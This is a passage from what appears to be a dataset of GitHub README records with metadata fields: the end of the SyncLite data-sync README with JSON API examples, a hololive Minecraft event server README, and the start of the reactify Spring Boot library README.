 		""message"" : ""Batch executed successfully, rows affected: 2""
   	}
  	```

	- Send a request to begin a transaction on database

 	Request
	 ```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""begin""
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Transaction started successfully""
  		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
   	}
  	```
	
	- Send a request to execute a sql inside started transaction

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""INSERT INTO t1(a,b) VALUES(?, ?)""
		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
 		""arguments"" : [[3, ""three""], [4, ""four""]]
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Batch executed successfully, rows affected: 2""
   	}
  	```

	- Send a request to commit a transaction

	Request	
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
  		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
 		""sql"" : ""commit""
 	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Transaction committed successfully""
   	}
  	```

	- Send a request to close database   	
 	Request

	 ```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""close""
   	}
 	```
	
 	Response from Server 
 	```
  	{
  		""result"" : ""true""
		""message"" : ""Database closed successfully""
   	}
  	```
 
5. SyncLite DB (internally leveraging SyncLite Logger), creates a device stage directory at configured stage path with sql logs created for each device. These device stage directories are continuously synchronized with SyncLite consolidator for consolidating them into final destination databases.
   
6. Several such hosts, each running SyncLite DB, each of them creating several SyncLite databases/devices (i.e. embedded databases), can synchornize these embedded databases in real-time with a centralized SyncLite consolidator that aggregates the incoming data and changes, in real-time, into configured destination databases.

     
# Running Integration Tests

```SyncLite Validator``` is a GUI based tool with a war file deployed on app server, it can be launched at http://localhost:8080/synclite-validator. A test job can be configured and run to execute all the end to end integration tests which validate data consolidation functionality for various SyncLite device types.  
    
	
# Pre-Built Releases:

## SyncLite Logger

1. SyncLite Logger is is published as maven dependency :
   ```
	<!-- https://mvnrepository.com/artifact/io.synclite/synclite-logger -->
	<dependency>
	    <groupId>io.synclite</groupId>
	    <artifactId>synclite-logger</artifactId>
	    <version>#LatestVersion#</version>
	</dependency>
   ```
2. OR You can directly download the latest published synclite-logger-<version>.jar from : https://github.com/syncliteio/SyncLiteLoggerJava/blob/main/src/main/resources/ and add it as a dependency in your applications.
   
## SyncLite Consolidator

1. A docker image of SyncLite Consolidator is available on docker hub : https://hub.docker.com/r/syncliteio/synclite-consolidator

2. OR a release zip file can be downloaded from this GitHub Repo : https://github.com/syncliteio/SyncLite/releases

# Supported Systems

## Source Systems
1. Edge Applications(Java/Python) +  SyncLite Logger (wrapping embedded databases :SQLite, DuckDB, Apache Derby, H2, HyperSQL)
2. Edge Applications (any programming language) + SyncLite DB (wrapping embedded databases :SQLite, DuckDB, Apache Derby, H2, HyperSQL)
3. Databases : PostgreSQL, MySQL, MongoDB, SQLite
4. Message Brokers : Eclipse Mosquitto MQTT broker
5. Data Files : CSV ( stored on FS/S3/MinIO)

## Staging Storages
1. Local FS
2. SFTP
3. S3
4. MinIO
5. Kafka
6. Microsoft OneDrive
7. Google Drive
   
## Destination Systems
1. PostgreSQL
2. MySQL
3. MongoDB
4. Microsoft SQL Server
5. Apache Iceberg
8. ClickHouse
9. FerretDB
6. SQLite
7. DuckDB

# Patent
SyncLite is backed by patented technlogy, more info : https://www.synclite.io/resources/patent  

# Support
Join <a href=https://join.slack.com/t/syncliteworkspace/shared_invite/zt-2pz945vva-uuKapsubC9Mu~uYDRKo6Jw>Slack Channel</a> for support and discussions.

Contact: support@synclite.io
",3,3,5,apache-2.0,5.0,"['synclite', 'build', 'anything', 'sync', 'anywhere', 'synclite', 'comprehensive', 'relational', 'data', 'consolidation', 'platform', 'enabling', 'developer', 'rapidly', 'build', 'data', 'intensive', 'application', 'edge', 'desktop', 'mobile', 'environment', 'synclite', 'enables', 'transactional', 'data', 'replication', 'consolidation', 'various', 'source', 'including', 'application', 'using', 'popular', 'embedded', 'database', 'sqlite', 'duckdb', 'apache', 'derby', 'hypersql', 'data', 'streaming', 'application', 'iot', 'message', 'broker', 'traditional', 'database', 'system', 'etl', 'diverse', 'array', 'database', 'data', 'warehouse', 'data', 'lake', 'enabling', 'ai', 'ml', 'edge', 'cloud', 'synclite', 'enables', 'following', 'scenario', 'industry', 'leading', 'database', 'data', 'warehouse', 'data', 'lake', 'build', 'application', 'synclite', 'provides', 'novel', 'cdc', 'replication', 'framework', 'embedded', 'database', 'helping', 'developer', 'quickly', 'build', 'application', 'including', 'gen', 'ai', 'search', 'rag', 'application', 'edge', 'desktop', 'mobile', 'environment', 'integrates', 'seamlessly', 'popular', 'embedded', 'database', 'like', 'sqlite', 'duckdb', 'apache', 'derby', 'hypersql', 'hsqldb', 'enabling', 'change', 'data', 'capture', 'cdc', 'transactional', 'data', 'replication', 'consolidation', 'database', 'data', 'warehouse', 'data', 'lake', 'embeddable', 'java', 'library', 'jdbc', 'driver', 'consumed', 'java', 'python', 'application', 'efficient', 'data', 'syncing', 'capturing', 'sql', 'transaction', 'log', 'file', 'shipping', 'log', 'file', 'configured', 'staging', 'storage', 'standalone', 'database', 'accepting', 'sql', 'request', 'json', 'format', 'http', 'making', 'compatible', 'programming', 'language', 'java', 'python', 'c', 'go', 'rust', 'ruby', 'etc', 'ideal', 'flexible', 'data', 'integration', 'consolidation', 'right', 'application', 'final', 'data', 'destination', 'learn', 'http', 'http', 'build', 'streaming', 'application', 'last', 'mile', 'delivery', 'synclite', 'facilitates', 'development', 'data', 'streaming', 'application', 'synclite', 'logger', 'offer', 'kafka', 'producer', 'api', 'sql', 'api', 'allows', 'ingestion', 'massive', 'amount', 'data', 'provides', 'capability', 'query', 'ingested', 'data', 'using', 'sql', 'api', 'within', 'application', 'together', 'synclite', 'logger', 'synclite', 'consolidator', 'enable', 'seamless', 'data', 'integration', 'thousand', 'streaming', 'application', 'instance', 'diverse', 'array', 'final', 'data', 'destination', 'learn', 'http', 'deploy', 'database', 'pipeline', 'set', 'scalable', 'database', 'etl', 'pipeline', 'diverse', 'range', 'source', 'database', 'raw', 'data', 'file', 'diverse', 'range', 'destination', 'learn', 'http', 'setup', 'rapid', 'iot', 'data', 'connector', 'connect', 'numerous', 'mqtt', 'broker', 'iot', 'gateway', 'one', 'destination', 'database', 'learn', 'http', 'synclite', 'component', 'jdbc', 'driver', 'enables', 'developer', 'rapidly', 'build', 'robust', 'responsive', 'transactional', 'data', 'intensive', 'application', 'platform', 'using', 'favorite', 'embedded', 'database', 'sqlite', 'duckdb', 'apache', 'derby', 'hypersql', 'scale', 'data', 'streaming', 'solution', 'last', 'mile', 'data', 'integration', 'wide', 'range', 'industry', 'leading', 'database', 'offering', 'ability', 'perform', 'analytics', 'using', 'native', 'embedded', 'database', 'streaming', 'data', 'producer', 'end', 'pipeline', 'database', 'server', 'wrap', 'popular', 'embedded', 'database', 'like', 'sqlite', 'duckdb', 'apache', 'derby', 'hypersql', 'unlike', 'embeddable', 'synclite', 'logger', 'library', 'java', 'python', 'application', 'synclite', 'db', 'act', 'standalone', 'server', 'allowing', 'edge', 'desktop', 'programming', 'connect', 'send', 'sql', 'request', 'wrapped', 'json', 'format', 'http', 'command', 'line', 'tool', 'operate', 'synclite', 'device', 'execute', 'sql', 'query', 'workload', 'enables', 'data', 'team', 'data', 'engineer', 'configure', 'orchestrate', 'highly', 'scalable', 'database', 'job', 'across', 'diverse', 'array', 'database', 'data', 'warehouse', 'data', 'lake', 'enables', 'developer', 'integrate', 'iot', 'data', 'published', 'message', 'queue', 'broker', 'diverse', 'array', 'database', 'data', 'warehouse', 'data', 'lake', 'enabling', 'analytics', 'ai', 'use', 'case', 'three', 'level', 'edge', 'fog', 'cloud', 'centralized', 'application', 'tool', 'mentioned', 'receives', 'consolidates', 'incoming', 'data', 'log', 'file', 'one', 'database', 'data', 'warehouse', 'data', 'lake', 'user', 'choice', 'synclite', 'consolidator', 'also', 'offer', 'additional', 'feature', 'filtering', 'mapping', 'data', 'type', 'mapping', 'database', 'trigger', 'installation', 'writes', 'support', 'multiple', 'destination', 'enables', 'managing', 'scheduling', 'monitoring', 'synclite', 'job', 'created', 'given', 'host', 'integration', 'testing', 'tool', 'synclite', 'build', 'synclite', 'using', 'release', 'ignore', 'section', 'apache', 'maven', 'http', 'opt', 'use', 'deploy', 'script', 'generated', 'release', 'download', 'prerequisite', 'software', 'apache', 'tomcat', 'openjdk', 'manually', 'install', 'a', 'openjdk', 'http', 'b', 'apache', 'tomcat', 'http', 'run', 'following', 'release', 'created', 'release', 'structure', 'build', 'process', 'creates', 'following', 'release', 'structure', 'quick', 'start', 'based', 'note', 'instruction', 'enable', 'quick', 'start', 'trial', 'synclite', 'platform', 'production', 'usage', 'recommended', 'go', 'installation', 'process', 'install', 'service', 'host', 'enter', 'bin', 'directory', 'one', 'time', 'run', 'window', 'ubuntu', 'deploy', 'synclite', 'consolidator', 'synclite', 'sample', 'application', 'run', 'ubuntu', 'deploy', 'docker', 'container', 'synclite', 'platform', 'manually', 'deploy', 'war', 'file', 'tomcat', 'server', 'run', 'window', 'ubuntu', 'start', 'tomcat', 'deployed', 'synclite', 'application', 'please', 'note', 'tomcat', 'manager', 'web', 'console', 'run', 'run', 'docker', 'container', 'please', 'check', 'option', 'passed', 'docker', 'run', 'command', 'home', 'directory', 'current', 'user', 'mapped', 'inside', 'docker', 'persist', 'synclite', 'storage', 'native', 'host', 'manually', 'start', 'application', 'tomcat', 'manager', 'console', 'open', 'tomcat', 'manager', 'console', 'http', 'use', 'default', 'prompted', 'set', 'deploy', 'script', 'manager', 'web', 'console', 'show', 'synclite', 'application', 'deployed', 'open', 'http', 'launch', 'synclite', 'consolidator', 'application', 'open', 'http', 'launch', 'synclite', 'sample', 'web', 'application', 'configure', 'start', 'synclite', 'consolidator', 'job', 'synclite', 'consolidator', 'application', 'follow', 'configure', 'job', 'wizard', 'reviewing', 'default', 'configuration', 'value', 'create', 'type', 'deployed', 'sample', 'web', 'application', 'execute', 'sql', 'workload', 'several', 'device', 'specifying', 'device', 'index', 'range', 'observe', 'data', 'consolidator', 'synclite', 'cosolidator', 'dashboard', 'check', 'device', 'specific', 'data', 'consolidation', 'progress', 'individual', 'device', 'page', 'list', 'device', 'page', 'query', 'destination', 'database', 'analyze', 'data', 'page', 'release', 'also', 'come', 'cli', 'client', 'synclite', 'run', 'window', 'ubuntu', 'start', 'client', 'tool', 'execute', 'sql', 'operation', 'native', 'database', 'also', 'consolidated', 'synclite', 'consolidator', 'destination', 'db', 'usage', 'usage', 'note', 'sever', 'switch', 'specified', 'client', 'connects', 'synclite', 'db', 'execute', 'sql', 'statement', 'else', 'usage', 'embedded', 'library', 'directly', 'operate', 'device', 'release', 'also', 'come', 'synclite', 'db', 'server', 'run', 'window', 'ubuntu', 'start', 'synclite', 'db', 'server', 'connect', 'using', 'execute', 'sql', 'operation', 'specified', 'embedded', 'database', 'also', 'consolidated', 'synclite', 'consolidator', 'onto', 'destination', 'database', 'usage', 'start', 'synclite', 'db', 'default', 'configuration', 'usage', 'use', 'window', 'linux', 'stop', 'synclite', 'consolidator', 'job', 'running', 'tomcat', 'run', 'stop', 'docker', 'container', 'refer', 'use', 'starting', 'point', 'build', 'application', 'database', 'choice', 'perform', 'data', 'consolidation', 'instead', 'default', 'sqlite', 'destination', 'postgresql', 'mysql', 'mongodb', 'sqlite', 'duckdb', 'release', 'also', 'package', 'docker', 'script', 'setup', 'postgresql', 'mysql', 'serve', 'synclite', 'destination', 'contains', 'contains', 'deploy', 'application', 'remote', 'share', 'respective', 'synclite', 'application', 'synclite', 'consolidator', 'host', 'via', 'one', 'following', 'file', 'staging', 'storage', 'sftp', 'amazon', 'minio', 'object', 'storage', 'server', 'apache', 'kafka', 'microsoft', 'onedrive', 'google', 'drive', 'nfs', 'sharing', 'local', 'network', 'sharing', 'please', 'check', 'documentation', 'setting', 'staging', 'storage', 'synclite', 'http', 'release', 'also', 'package', 'docker', 'script', 'setup', 'sftp', 'minio', 'server', 'serve', 'synclite', 'stage', 'contains', 'contains', 'note', 'script', 'contain', 'default', 'configuration', 'must', 'change', 'usernames', 'password', 'setup', 'additional', 'security', 'mechanism', 'top', 'basic', 'setup', 'synclite', 'docker', 'script', 'contain', 'two', 'variable', 'top', 'choose', 'stage', 'destination', 'stage', 'set', 'sftp', 'minio', 'dst', 'set', 'postgresql', 'mysql', 'set', 'stage', 'dst', 'appropriate', 'value', 'sftp', 'postgresql', 'script', 'bring', 'docker', 'container', 'synclite', 'consolidator', 'sftp', 'server', 'postgresql', 'server', 'set', 'configure', 'start', 'synclite', 'consoldiator', 'job', 'able', 'consolidate', 'data', 'postgresql', 'server', 'received', 'remote', 'synclite', 'application', 'configured', 'connect', 'sftp', 'stage', 'successful', 'trial', 'need', 'perform', 'another', 'trial', 'stop', 'docker', 'container', 'delete', 'content', 'start', 'fresh', 'trial', 'different', 'scenario', 'etc', 'open', 'http', 'open', 'http', 'setup', 'database', 'pipeline', 'open', 'http', 'open', 'http', 'setup', 'rapid', 'iot', 'pipeline', 'open', 'http', 'manage', 'monitor', 'schedule', 'various', 'synclite', 'job', 'refer', 'documentation', 'http', 'detail', 'note', 'production', 'usage', 'recommended', 'install', 'tomcat', 'service', 'application', 'server', 'choice', 'deploy', 'synclite', 'consolidator', 'web', 'archive', 'release', 'please', 'refer', 'documentation', 'detailed', 'installation', 'step', 'window', 'ubuntu', 'using', 'synclite', 'logger', 'add', 'file', 'created', 'part', 'build', 'dependency', 'application', 'configuration', 'file', 'refer', 'file', 'available', 'configuration', 'option', 'synclite', 'logger', 'refer', 'synclite', 'logger', 'configuration', 'section', 'documentation', 'http', 'detail', 'configuration', 'option', 'application', 'code', 'sample', 'sql', 'api', 'refer', 'code', 'sample', 'build', 'application', 'using', 'synclite', 'logger', 'transactional', 'device', 'transactional', 'device', 'sqlite', 'duckdb', 'apache', 'derby', 'hypersql', 'support', 'database', 'operation', 'perform', 'transactional', 'logging', 'ddl', 'dml', 'operation', 'performed', 'application', 'enable', 'developer', 'build', 'use', 'case', 'building', 'application', 'edge', 'edge', 'cloud', 'genai', 'search', 'rag', 'application', 'native', 'sql', 'hot', 'hot', 'data', 'store', 'sql', 'application', 'cache', 'edge', 'enablement', 'cloud', 'database', 'java', 'python', 'appender', 'device', 'appender', 'device', 'sqliteappender', 'duckdbappender', 'derbyappender', 'hypersqlappender', 'support', 'ddl', 'operation', 'prepared', 'statement', 'based', 'insert', 'operation', 'highly', 'optimized', 'high', 'speed', 'concurrent', 'batched', 'data', 'ingestion', 'performing', 'logging', 'ingested', 'data', 'unlike', 'transactional', 'device', 'appender', 'device', 'allow', 'insert', 'dml', 'operation', 'update', 'delete', 'allowed', 'appender', 'device', 'enable', 'developer', 'build', 'high', 'volume', 'streaming', 'application', 'enabled', 'last', 'mile', 'data', 'integration', 'thousand', 'edge', 'point', 'centralized', 'database', 'destination', 'well', 'analytics', 'enabling', 'fast', 'read', 'access', 'ingested', 'data', 'underlying', 'local', 'embedded', 'database', 'storing', 'data', 'java', 'python', 'streaming', 'device', 'streaming', 'device', 'allows', 'ddl', 'operation', 'supported', 'sqlite', 'prepared', 'statement', 'based', 'insert', 'operation', 'update', 'delete', 'allowed', 'allow', 'high', 'speed', 'concurrent', 'batched', 'data', 'ingestion', 'performing', 'logging', 'streaming', 'ingested', 'data', 'streaming', 'device', 'enable', 'developer', 'build', 'high', 'volume', 'data', 'streaming', 'application', 'enabled', 'last', 'mile', 'data', 'integration', 'thousand', 'edge', 'application', 'one', 'centralized', 'lake', 'java', 'python', 'application', 'code', 'sample', 'kafka', 'api', 'launching', 'using', 'synclite', 'db', 'database', 'server', 'wrap', 'popular', 'embedded', 'database', 'like', 'sqlite', 'duckdb', 'apache', 'derby', 'hypersql', 'unlike', 'embeddable', 'library', 'java', 'python', 'application', 'act', 'standalone', 'server', 'allowing', 'edge', 'desktop', 'programming', 'connect', 'sql', 'request', 'wrapped', 'json', 'format', 'via', 'rest', 'api', 'make', 'ideal', 'solution', 'seamless', 'data', 'synchronization', 'diverse', 'environment', 'go', 'directory', 'check', 'configuration', 'adjust', 'per', 'need', 'run', 'linux', 'start', 'synclite', 'db', 'server', 'listening', 'specified', 'address', 'application', 'favoirite', 'programming', 'language', 'establish', 'connection', 'synclite', 'db', 'server', 'specified', 'address', 'send', 'request', 'json', 'format', 'connect', 'initialize', 'device', 'request', 'response', 'server', 'send', 'sql', 'command', 'create', 'table', 'request', 'response', 'server', 'send', 'request', 'perform', 'batched', 'insert', 'created', 'table', 'request', 'response', 'server', 'send', 'request', 'begin', 'transaction', 'database', 'request', 'response', 'server', 'send', 'request', 'execute', 'sql', 'inside', 'started', 'transaction', 'request', 'response', 'server', 'send', 'request', 'commit', 'transaction', 'request', 'response', 'server', 'send', 'request', 'close', 'database', 'request', 'response', 'server', 'synclite', 'db', 'internally', 'leveraging', 'synclite', 'logger', 'creates', 'device', 'stage', 'directory', 'configured', 'stage', 'path', 'sql', 'log', 'created', 'device', 'device', 'stage', 'directory', 'continuously', 'synchronized', 'synclite', 'consolidator', 'consolidating', 'final', 'destination', 'database', 'several', 'host', 'running', 'synclite', 'db', 'creating', 'several', 'synclite', 'embedded', 'database', 'synchornize', 'embedded', 'database', 'centralized', 'synclite', 'consolidator', 'aggregate', 'incoming', 'data', 'change', 'configured', 'destination', 'database', 'running', 'integration', 'test', 'gui', 'based', 'tool', 'war', 'file', 'deployed', 'app', 'server', 'launched', 'http', 'test', 'job', 'configured', 'run', 'execute', 'end', 'end', 'integration', 'test', 'validate', 'data', 'consolidation', 'functionality', 'various', 'synclite', 'device', 'type', 'releases', 'synclite', 'logger', 'synclite', 'logger', 'published', 'maven', 'dependency', 'directly', 'download', 'latest', 'published', 'http', 'add', 'dependency', 'application', 'synclite', 'consolidator', 'docker', 'image', 'synclite', 'consolidator', 'available', 'docker', 'hub', 'http', 'release', 'zip', 'file', 'downloaded', 'github', 'repo', 'http', 'supported', 'system', 'source', 'system', 'edge', 'application', 'synclite', 'logger', 'wrapping', 'embedded', 'database', 'sqlite', 'duckdb', 'apache', 'derby', 'hypersql', 'edge', 'application', 'programming', 'language', 'synclite', 'db', 'wrapping', 'embedded', 'database', 'sqlite', 'duckdb', 'apache', 'derby', 'hypersql', 'database', 'postgresql', 'mysql', 'mongodb', 'sqlite', 'message', 'broker', 'eclipse', 'mosquitto', 'mqtt', 'broker', 'data', 'file', 'csv', 'stored', 'staging', 'storage', 'local', 'f', 'sftp', 'minio', 'kafka', 'microsoft', 'onedrive', 'google', 'drive', 'destination', 'system', 'postgresql', 'mysql', 'mongodb', 'microsoft', 'sql', 'server', 'apache', 'iceberg', 'clickhouse', 'ferretdb', 'sqlite', 'duckdb', 'patent', 'synclite', 'backed', 'patented', 'technlogy', 'info', 'http', 'support', 'join', 'slack', 'channel', 'support', 'discussion', 'contact', 'support']","['synclite', 'data', 'application', 'database', 'http']",17,16,0,"['synclite', 'build', 'anything', 'sync', 'anywhere', 'build', 'application', 'build', 'streaming', 'application', 'for', 'last', 'mile', 'delivery', 'deploy', 'database', 'pipeline', 'setup', 'rapid', 'iot', 'data', 'connector', 'synclite', 'component', 'build', 'synclite', 'release', 'structure', 'quick', 'start', 'base', 'use', 'synclite', 'logger', 'configuration', 'file', 'application', 'code', 'sample', 'sql', 'api', 'transactional', 'device', 'java', 'python', 'appender', 'device', 'java', 'python', 'stream', 'device', 'java', 'python', 'application', 'code', 'sample', 'kafka', 'api', 'launch', 'use', 'synclite', 'db', 'run', 'integration', 'test', 'release', 'synclite', 'logger', 'synclite', 'consolidator', 'support', 'system', 'source', 'system', 'stag', 'storage', 'destination', 'system', 'patent', 'support']",33,"['synclite', 'build', 'application', 'device', 'java']",92,0.0,1.0,[org.apache.maven.plugins:maven-assembly-plugin],0.0,0.0,1.0,43565,27.150259067357517,5.747900763358778,[],0
aemisigna/hololiveid-kaela-event-public,main,"![Kaela's Event Logo](https://cdn.marow.dev/content/kaela_event_git_logo.png)

**Astonishingly KAEOTIC** is a Minecraft Event hosted by [Kaela Kovalskia](https://www.youtube.com/@KaelaKovalskia) and [hololive production](https://hololive.hololivepro.com/en).

[![Kaela's Tour](https://img.youtube.com/vi/n3BAPr9qGGQ/0.jpg)](https://www.youtube.com/watch?v=n3BAPr9qGGQ)

## 🔨 Technical details
- Server must use the [PaperMC](https://papermc.io) and [Nitori](https://github.com/Gensokyo-Reimagined/Nitori) software.
- It's recommended to use a proxy software like [Velocity](https://papermc.io/software/velocity) or [BungeeCord](https://www.spigotmc.org/wiki/bungeecord/).
- It's highly recommended to enable the server [resource pack](https://cdn.marow.dev/content/KaelaEventPack.zip), otherwise stuff might be a little weird.

## 🔨 Resource Pack
- Resource pack can be downloaded [here](https://cdn.marow.dev/content/KaelaEventPack.zip)
- Resources are on Minecraft version **1.21.1**.

## 🔨 Warning
- This server setup was made for [COVER Corporation](https://cover-corp.com/en/company) & [hololive production](https://hololive.hololivepro.com/en).
- The server is not made to be easy to install outside of the event host.
- This page is going to change by the time!

## 🔨 Acknowledgments
- [COVER Corporation](https://cover-corp.com/en/company) for once more, hosting awesome events!
- [Kaela Kovalskia](https://www.youtube.com/@KaelaKovalskia) for the opportunity!
- [Allan Castro](https://x.com/Allan_z8), for the server resource pack making.",1,0,1,apache-2.0,0.0,"['astonishingly', 'kaeotic', 'minecraft', 'event', 'hosted', 'kaela', 'kovalskia', 'hololive', 'production', 'technical', 'detail', 'server', 'must', 'use', 'papermc', 'nitori', 'software', 'recommended', 'use', 'proxy', 'software', 'like', 'velocity', 'bungeecord', 'highly', 'recommended', 'enable', 'server', 'resource', 'pack', 'otherwise', 'stuff', 'might', 'little', 'weird', 'resource', 'pack', 'resource', 'pack', 'downloaded', 'resources', 'minecraft', 'version', 'warning', 'server', 'setup', 'made', 'cover', 'corporation', 'hololive', 'production', 'server', 'made', 'easy', 'install', 'outside', 'event', 'host', 'page', 'going', 'change', 'time', 'acknowledgment', 'cover', 'corporation', 'hosting', 'awesome', 'event', 'kaela', 'kovalskia', 'opportunity', 'allan', 'castro', 'server', 'resource', 'pack', 'making']","['server', 'resource', 'pack', 'event', 'minecraft']",0,0,0,"['technical', 'detail', 'resource', 'pack', 'warn', 'acknowledgment']",4,"['technical', 'detail', 'resource', 'pack', 'warn']",0,0.0,1.0,"[ca.bkaw:paper-nms-maven-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0,1547,17.23076923076923,5.209821428571429,"[""Kaela's Event Logo -> https://cdn.marow.dev/content/kaela_event_git_logo.png"", 'Kaela Kovalskia -> https://www.youtube.com/@KaelaKovalskia', 'hololive production -> https://hololive.hololivepro.com/en', ""![Kaela's Tour -> https://img.youtube.com/vi/n3BAPr9qGGQ/0.jpg"", 'PaperMC -> https://papermc.io', 'Nitori -> https://github.com/Gensokyo-Reimagined/Nitori', 'Velocity -> https://papermc.io/software/velocity', 'BungeeCord -> https://www.spigotmc.org/wiki/bungeecord/', 'resource pack -> https://cdn.marow.dev/content/KaelaEventPack.zip', 'here -> https://cdn.marow.dev/content/KaelaEventPack.zip', 'COVER Corporation -> https://cover-corp.com/en/company', 'hololive production -> https://hololive.hololivepro.com/en', 'COVER Corporation -> https://cover-corp.com/en/company', 'Kaela Kovalskia -> https://www.youtube.com/@KaelaKovalskia', 'Allan Castro -> https://x.com/Allan_z8']",15
hoangtien2k3/reactify,main,"<h3 align=""center"">
<img src=""docs/images/reactify_banner.png"" alt=""Ezbuy"" width=""300"" />

<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">📚Docs</a> |
<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">💬Chat</a> |
<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">✨Live Demo</a>
</h3>

##

Reactify [a commons Java lib]() with spring boot framework, Supports using keycloak, filter, trace log, cached, minio
server, exception handler, validate and call API with webclient

This README provides quickstart instructions on running [`reactify`]() on bare metal project spring boot.

[![SonarCloud](https://sonarcloud.io/images/project_badges/sonarcloud-white.svg)](https://sonarcloud.io/summary/new_code?id=hoangtien2k3_reactify)

[![CircleCI](https://circleci.com/gh/hoangtien2k3/reactify.svg?style=svg)](https://app.circleci.com/pipelines/github/hoangtien2k3/reactify)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=hoangtien2k3_reactify&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=hoangtien2k3_reactify)
[![Lines of Code](https://sonarcloud.io/api/project_badges/measure?project=hoangtien2k3_reactify&metric=ncloc)](https://sonarcloud.io/summary/overall?id=hoangtien2k3_reactify)
[![GitHub Release](https://img.shields.io/github/v/release/hoangtien2k3/reactify?label=latest%20release)](https://mvnrepository.com/artifact/io.github.hoangtien2k3/reactify)
[![License](https://img.shields.io/badge/license-Apache--2.0-green.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)
[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/9383/badge)](https://www.bestpractices.dev/projects/9383)
[![Build status](https://github.com/ponfee/commons-core/workflows/build-with-maven/badge.svg)](https://github.com/hoangtien2k3/reactify/actions)

## Download
Gradle is the only supported build configuration, so just add the dependency to your project build.gradle file:

⬇️ Download Gradle and Maven

```kotlin
dependencies {
  implementation 'io.github.hoangtien2k3:reactify:$latest'
}
```

```maven
<dependency>
   <groupId>io.github.hoangtien2k3</groupId>
   <artifactId>reactify</artifactId>
   <version>${latest}</version>
</dependency>
```

The latest `reactify` version is: [![GitHub Release](https://img.shields.io/github/v/release/hoangtien2k3/reactify?label=latest)](https://mvnrepository.com/artifact/io.github.hoangtien2k3/reactify)

The latest stable lib `reactify` version is: latestVersion Click [here](https://central.sonatype.com/namespace/io.github.hoangtien2k3) for more information on reactify.

## Getting Started

1. Correct and complete setup to start the program `application.yml` or `application.properties`
   with [CONFIG](src/main/resources/application.yml)

2. The [reference documentation]() includes detailed [installation instructions]() as well as a
   comprehensive [getting started]() guide.

Here is a quick teaser of a complete Spring Boot application in Java:

```java
@SpringBootApplication
@ComponentScan(basePackages = {
        ""io.hoangtien2k3.reactify.*"",
        ""com.example.myproject""
})
public class Example {

    @RequestMapping(""/"")
    String home() {
        return ""Hello World!"";
    }

    public static void main(String[] args) {
        SpringApplication.run(Example.class, args);
    }
}
```

## Contributing

If you would like to contribute to the development of this project, please follow our contribution guidelines.

![Alt](https://repobeats.axiom.co/api/embed/31a861bf21d352264c5c122808407abafb97b0ef.svg ""Repobeats analytics image"")


## Star History

<a href=""https://star-history.com/#hoangtien2k3/fw-commons&Timeline"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline"" />
 </picture>
</a>

## Contributors ✨

<a href=""https://github.com/hoangtien2k3/reactify/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=hoangtien2k3/reactify"" />
</a>

## License

This project is licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0)

```
Apache License
Copyright (c) 2024 Hoàng Anh Tiến
```

## Lead to This Project 🌈

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tr>
    <td align=""center""><a href=""https://www.linkedin.com/in/hoangtien2k3/""><img src=""https://avatars.githubusercontent.com/u/122768076?v=4?s=100"" width=""100px;"" alt=""""/><br /><sub><b>Hoàng Anh Tiến</b></sub></a><br /><a href=""https://github.com/hoangtien2k3/news-app/commits?author=hoangtien2k3"" title=""Code"">💻</a> <a href=""#maintenance-hoangtien2k3"" title=""Maintenance"">🚧</a> <a href=""#ideas-hoangtien2k3"" title=""Ideas, Planning, & Feedback"">🤔</a> <a href=""#design-hoangtien2k3"" title=""Design"">🎨</a> <a href=""https://github.com/hoangtien2k3/news-app/issues?q=author%hoangtien2k3"" title=""Bug reports"">🐛</a></td>
  </tr>

</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->
<!-- ALL-CONTRIBUTORS-LIST:END -->
",6,0,15,apache-2.0,1.0,"['demo', 'reactify', 'common', 'java', 'lib', 'spring', 'boot', 'framework', 'support', 'using', 'keycloak', 'filter', 'trace', 'log', 'cached', 'minio', 'server', 'exception', 'handler', 'validate', 'call', 'api', 'webclient', 'readme', 'provides', 'quickstart', 'instruction', 'running', 'bare', 'metal', 'project', 'spring', 'boot', 'download', 'gradle', 'supported', 'build', 'configuration', 'add', 'dependency', 'project', 'file', 'download', 'gradle', 'maven', 'latest', 'version', 'latest', 'stable', 'lib', 'version', 'latestversion', 'click', 'information', 'reactify', 'getting', 'started', 'correct', 'complete', 'setup', 'start', 'program', 'config', 'reference', 'documentation', 'includes', 'detailed', 'installation', 'instruction', 'well', 'comprehensive', 'getting', 'started', 'guide', 'quick', 'teaser', 'complete', 'spring', 'boot', 'application', 'java', 'contributing', 'would', 'like', 'contribute', 'development', 'project', 'please', 'follow', 'contribution', 'guideline', 'star', 'history', 'contributor', 'license', 'project', 'licensed', 'apache', 'license', 'version', 'lead', 'project']","['project', 'spring', 'boot', 'version', 